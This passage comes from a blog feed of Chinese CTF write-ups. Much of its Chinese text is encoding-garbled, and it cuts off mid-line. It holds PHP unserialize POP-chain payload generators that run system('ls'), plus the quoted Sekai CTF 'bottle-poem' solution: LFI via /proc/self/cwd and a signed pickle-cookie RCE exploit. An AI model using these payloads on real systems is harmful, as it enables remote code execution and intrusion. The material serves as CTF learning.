class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;  </span><br><span class="line"><span class="comment">//secret_codeç±»çš„showå‡½æ•°æœ‰this-&gt;code-&gt;secretï¼Œsecretå±æ€§æ˜¯æ‰€æœ‰ç±»éƒ½æ²¡æœ‰çš„ï¼Œè‡ªç„¶è”æƒ³åˆ°__getï¼Œåœ¨Sorryç±»é‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>popé“¾çš„æ„é€ </p><p>åˆ‡å…¥å£ sorryç±»çš„ææ„å‡½æ•°ï¼Œ<strong>çªç ´å£fineç±»çš„__invokeå‡½æ•°ä¸­çš„call_user_funcå‡½æ•°</strong></p><p><code>sorry.__destruct -&gt; show.__toString</code><br><code>-&gt;</code><br><code>secret.show()</code><br><code>-&gt;</code><br><code>sorry.__get -&gt; fine.__invoke</code><br><code>-&gt;</code><br><code>call_user_funcå‡½æ•°</code></p><p>#call_user_func(a,b) â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨, å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°<br>#ä¹Ÿå°±æ˜¯æŠŠaå½“ä½œå‡½æ•°ï¼ŒæŠŠbå½“ä½œä¼ å…¥aå‡½æ•°çš„å‚æ•°ã€å¦‚call_user_func(assert,phpinfo()),å°±ä¼šæ‰§è¡Œä»£ç phpinfo()ã€‘</p></blockquote><p>æ‰€ä»¥<code>payload</code>ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$Show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$Sorry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$Sorry2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="comment">//è¿™é‡Œå®ä¾‹åŒ–ä¸¤æ¬¡sorryæ˜¯å› ä¸ºå½“ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œä¼šæ‰§è¡Œ__destruct()é­”æœ¯æ–¹æ³•ï¼Œä»è€Œæ¸…ç©ºäº†å˜é‡å¼•ç”¨ï¼Œä¹Ÿå°±ç›¸å½“äºå…³é—­äº†è¿™ä¸ªç±»ï¼Œ</span></span><br><span class="line"><span class="comment">//ä½†æ˜¯åç»­è¿˜éœ€è¦è°ƒç”¨å…¶ä¸­çš„é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦å†æ¬¡å®ä¾‹åŒ–ï¼Œå¹¶é‡æ–°ä¸ºpasswordå’Œnameç›¸åŒèµ‹å€¼</span></span><br><span class="line"><span class="variable">$Secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;hint = <span class="variable">$Show</span>;</span><br><span class="line"><span class="variable">$Show</span>-&gt;ctf = <span class="variable">$Secret</span>;</span><br><span class="line"><span class="variable">$Secret</span>-&gt;code = <span class="variable">$Sorry2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;key = <span class="variable">$Fine</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;cmd = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¡¥å……</strong>ï¼šå¦ä¸€ç§å†™æ³•ï¼Œä¸€å®šè¦<code>url</code>ç¼–ç ï¼Œå› ä¸ºé‡Œè¾¹æœ‰ä¸å¯è§å­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span>, <span class="variable">$time</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;time = <span class="variable">$time</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span>,<span class="variable">$hint</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint  = <span class="variable">$hint</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Sorry</span>= <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>))),<span class="string">&#x27;cc&#x27;</span>),<span class="string">&#x27;cc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å› ä¸ºè¿™é‡Œæ²¡æœ‰ä¿®æ”¹å˜é‡ä¿®é¥°ï¼Œ</span></span><br><span class="line"><span class="comment">//å¯¹äºprivateä¿®é¥°å˜é‡æ— æ³•ç›´æ¥ä¼ å‚ï¼Œéœ€è¦å®ä¾‹åŒ–ç±»xx(a,b)ï¼Œç„¶åæ‰èƒ½æˆåŠŸä¼ å‚ï¼Œå½“ç„¶publicç±»ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹æ³•ä¼ å‚ï¼Œåªæ˜¯æ²¡å¿…è¦ï¼Œä½†è¿™é‡Œæ˜¯ç”¨äº†çš„</span></span><br><span class="line"><span class="comment">//æ¯”å¦‚sorryç±»ä¸­nameå’Œpasswordå˜é‡èµ‹å€¼ä¸ºccåï¼Œåé¢å®ä¾‹åŒ–çš„showç±»å°±æ˜¯èµ‹å€¼ç»™public hintå˜é‡ï¼Œæ˜¯æŒ‰å˜é‡å£°æ˜é¡ºåºæ¥è¿›è¡Œèµ‹å€¼çš„</span></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„åµŒå¥—å°±æ˜¯åŒä¸Šé¢çš„payloadä¸€æ ·ï¼Œåªæ˜¯æŠŠå˜é‡èµ‹å€¼ä¸ºå®ä¾‹åŒ–çš„ç±»ï¼Œå®ä¾‹åŒ–ç±»çš„é‡Œé¢å†åµŒå…¥å˜é‡å€¼å’Œå…¶ä»–å®ä¾‹åŒ–çš„ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sekai CTF</title>
      <link href="/2023/02/13/SekaiCTF-wp/"/>
      <url>/2023/02/13/SekaiCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Sekai-CTF"><a href="#Sekai-CTF" class="headerlink" title="Sekai CTF"></a>Sekai CTF</h1><p><a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a></p><p>è¿™æ˜¯å®˜æ–¹çš„<code>wp</code>å’Œé¢˜ç›®çš„<code>docker</code>ï¼Œæˆ‘åé¢è¿˜æ˜¯æŠŠ<code>web</code>éƒ½å¤ç°ä¸€ä¸‹</p><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003101420158.png" alt="image-20221003101420158"></p><p><code>å¤§æ¯”èµ›ï¼Œæ¯ä¸ªé¢˜è¦ä¹ˆéš¾å‡ºå¤´ï¼Œè¦ä¹ˆæ„Ÿè§‰å°±å·®ä¸€ç‚¹ï¼Œä¸å¤§ä½¬çš„å·®è·ï¼Œé¼ é¼ åªèƒ½èµ›åå¤ç°wpäº†</code></p><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003104433566.png" alt="image-20221003104433566"></p><p><code>è¿™æ˜¯webéš¾åº¦ã€çœ‹èµ·æ¥å°±æ˜¯æŒ‰è§£é¢˜äººæ•°æ¥åˆ†ã€‘</code></p><h2 id="1-bottle-poem-åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯"><a href="#1-bottle-poem-åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯" class="headerlink" title="1.bottle-poem[åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯]"></a>1.bottle-poem[åç»­å­¦ä¹ äº†ï¼Œè¡¥ä¸Šè‡ªå·±çš„æ€è·¯]</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hintï¼š</span><br><span class="line"></span><br><span class="line">Come <span class="keyword">and</span> <span class="keyword">read</span> poems <span class="keyword">in</span> the bottle.</span><br><span class="line"></span><br><span class="line"><span class="keyword">No</span> bruteforcing <span class="keyword">is</span> required <span class="keyword">to</span> solve this challenge. Please <span class="keyword">do</span> <span class="keyword">not</span> use scanner tools. Rate limiting <span class="keyword">is</span> applied. Flag <span class="keyword">is</span> executable <span class="keyword">on</span> <span class="keyword">server</span>.</span><br><span class="line"></span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line"></span><br><span class="line">å¿«æ¥è¯»ä¸€è¯»ç“¶ä¸­çš„è¯—å§ã€‚</span><br><span class="line"></span><br><span class="line">è§£å†³è¿™ä¸€æŒ‘æˆ˜ä¸éœ€è¦æš´åŠ›ç ´è§£ã€‚è¯·ä¸è¦ä½¿ç”¨æ‰«æä»ªå·¥å…·ã€‚åº”ç”¨é€Ÿç‡é™åˆ¶ã€‚æ ‡å¿—åœ¨æœåŠ¡å™¨ä¸Šæ˜¯å¯æ‰§è¡Œçš„ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æˆ‘å·²ç»ç§ƒå¤´äº†ï¼Œå¼€å§‹è§‰å¾—æ˜¯å•çº¯çš„æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯åé¢çœ‹åˆ°å®˜æ–¹å‘çš„wpï¼Œæ„Ÿè§‰åˆæ²¡é‚£ä¹ˆç®€å•</p><p>æˆ‘å…ˆç›´æ¥å±•ç¤ºå®˜æ–¹çš„wpï¼Œç„¶åå†å±•ç¤ºæˆ‘å¤ç°çš„è¿‡ç¨‹</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Hey guys Thx <span class="keyword">for</span> attending SekaiCTF  i made two challenges <span class="keyword">for</span> this competition one is bottle poem another is sekaigame start</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the bottle poem most of people think its guessy and at the start the challenge always down  so say sorry to u and respect to my buddy hfz that he fix this challenge </span><br><span class="line"></span><br><span class="line">here is my short wp</span><br><span class="line">-----------------</span><br><span class="line">it&#x27;s easy to find that this website has LFI</span><br><span class="line">u wanna to  <span class="keyword">read</span> <span class="keyword">file</span> directly but failed </span><br><span class="line">that&#x27;s not show u that we hide it  that means u havent enough execute permission to <span class="keyword">read</span> it (so we <span class="keyword">update</span> description that flag is executable and u dont need some bruteforcing or guessing)flag is in the common path /flag</span><br><span class="line"></span><br><span class="line">so we need to <span class="keyword">read</span> <span class="keyword">source</span></span><br><span class="line">just like this</span><br><span class="line"></span><br><span class="line"><span class="keyword">http</span>://bottle-poem.ctf.sekai.team/show?id=/<span class="keyword">proc</span>/self/cwd/app.py<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">so</span> dont<span class="title"> need</span> to<span class="title"> bruteforce</span> <span class="keyword">proc</span>/self/<span class="title"> just</span> use<span class="title"> it</span> to<span class="title"> got</span> sourcecode<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">use</span> this<span class="title"> way</span> u<span class="title"> can</span> read<span class="title"> the</span> secret --sekai<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">now</span> u<span class="title"> can</span> control<span class="title"> the</span> cookies<span class="title"> but</span> if<span class="title"> u</span> read<span class="title"> something</span> just<span class="title"> like</span> /views/admin.html<span class="title"> or</span> just<span class="title"> make</span> guest<span class="title"> to</span> admin<span class="title"> u</span> would<span class="title"> find</span> its<span class="title"> a</span> troll<span class="title"> </span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">so</span> u<span class="title"> need</span> rce<span class="title"> truely</span> if<span class="title"> u</span> search<span class="title"> some</span> documentation<span class="title"> will</span> find<span class="title"> the</span> bottle&#x27;s<span class="title"> cookie_decode()</span> will<span class="title"> unpickle</span> so<span class="title"> use</span> this<span class="title"> to</span> get<span class="title"> rce</span></span><br><span class="line">https://github.com/bottlepy/bottle/issues/900<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">here</span> the<span class="title"> steps</span></span><br><span class="line">1.lfi<span class="title"> to</span> read<span class="title"> file</span> and<span class="title">    secret</span></span><br><span class="line">2.use<span class="title"> cookie</span> pickle<span class="title"> rce</span> to<span class="title"> reverse</span> a<span class="title"> shell</span></span><br><span class="line">3.execute /flag<span class="title"> to</span> get<span class="title"> flag</span></span><br><span class="line">---------<span class="title"></span></span><br><span class="line"><span class="title">and</span> my<span class="title"> exp</span> </span><br><span class="line">-------------<span class="title"></span></span><br><span class="line"><span class="title">demo</span> exp<span class="title"></span></span><br><span class="line"><span class="title">import</span> base64,hashlib,pickle,hmac<span class="title"></span></span><br><span class="line"><span class="title">import</span> os<span class="title"></span></span><br><span class="line"><span class="title">def</span> tob(s,<span class="title"> enc=&#x27;utf8&#x27;):</span></span><br><span class="line"><span class="title">    if</span> isinstance(s,<span class="title"> str):</span></span><br><span class="line"><span class="title">        return</span> s.encode(enc)<span class="title"></span></span><br><span class="line"><span class="title">    return</span> b&#x27;&#x27;<span class="title"> if</span> s<span class="title"> is</span> None<span class="title"> else</span> bytes(s)<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">def</span> cookie_encode(data,<span class="title"> key):</span></span><br><span class="line">    &#x27;&#x27;&#x27;<span class="title"> Encode</span> and<span class="title"> sign</span> a<span class="title"> pickle-able</span> object.<span class="title"> Return</span> a (byte)<span class="title"> string</span> &#x27;&#x27;&#x27;<span class="title"></span></span><br><span class="line"><span class="title">    msg</span> =<span class="title"> base64.b64encode(pickle.dumps(data,</span> 0))<span class="title"></span></span><br><span class="line"><span class="title">    sig</span> =<span class="title"> base64.b64encode(hmac.new(tob(key),</span> msg,<span class="title"> digestmod=hashlib.md5).digest())</span></span><br><span class="line"><span class="title">    return</span> tob(&#x27;!&#x27;) +<span class="title"> sig</span> +<span class="title"> tob(&#x27;?&#x27;)</span> +<span class="title"> msg</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">class</span> test():<span class="title"></span></span><br><span class="line"><span class="title">    def</span> __reduce__(self):<span class="title"></span></span><br><span class="line"><span class="title">        return</span> (eval,(&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;,))<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">obj</span> =<span class="title"> test()</span></span><br><span class="line">a =<span class="title"> cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>ç¿»è¯‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">å¤§å®¶å¥½ï¼Œæ„Ÿè°¢å‚åŠ  SekaiCTF æˆ‘ä¸ºè¿™æ¬¡æ¯”èµ›æå‡ºäº†ä¸¤ä¸ªæŒ‘æˆ˜ï¼Œä¸€ä¸ªæ˜¯ç“¶å­è¯—ï¼Œå¦ä¸€ä¸ªæ˜¯ sekaigame start</span><br><span class="line"></span><br><span class="line">å¯¹äºç“¶å­è¯—ï¼Œå¤§å¤šæ•°äººè®¤ä¸ºå®ƒæ˜¯çŒœæµ‹æ€§çš„ï¼Œä¸€å¼€å§‹æŒ‘æˆ˜æ€»æ˜¯å¤±è´¥ï¼Œæ‰€ä»¥å‘ä½ è¯´å£°æŠ±æ­‰ï¼Œå¹¶å°Šé‡æˆ‘çš„å¥½å‹ hfzï¼Œä»–è§£å†³äº†è¿™ä¸ªæŒ‘æˆ˜</span><br><span class="line"></span><br><span class="line">è¿™æ˜¯æˆ‘çš„ç®€çŸ­ wp</span><br><span class="line">-----------------</span><br><span class="line">å¾ˆå®¹æ˜“å‘ç°è¿™ä¸ªç½‘ç«™æœ‰LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</span><br><span class="line">ä½ æƒ³ç›´æ¥è¯»å–æ–‡ä»¶ä½†å¤±è´¥äº†</span><br><span class="line">è¿™å¹¶æ²¡æœ‰å‘Šè¯‰ä½ æˆ‘ä»¬éšè—å®ƒï¼Œè¿™æ„å‘³ç€ä½ æ²¡æœ‰è¶³å¤Ÿçš„æ‰§è¡Œæƒé™æ¥è¯»å–å®ƒï¼ˆæ‰€ä»¥æˆ‘ä»¬æ›´æ–°äº†æ ‡å¿—æ˜¯å¯æ‰§è¡Œçš„å¹¶ä¸”ä½ ä¸éœ€è¦ä¸€äº›æš´åŠ›ç ´è§£æˆ–çŒœæµ‹çš„æè¿°ï¼‰æ ‡å¿—åœ¨å…¬å…±è·¯å¾„/æ ‡å¿—ä¸­</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬éœ€è¦é˜…è¯»æºç </span><br><span class="line">åƒè¿™æ ·</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span 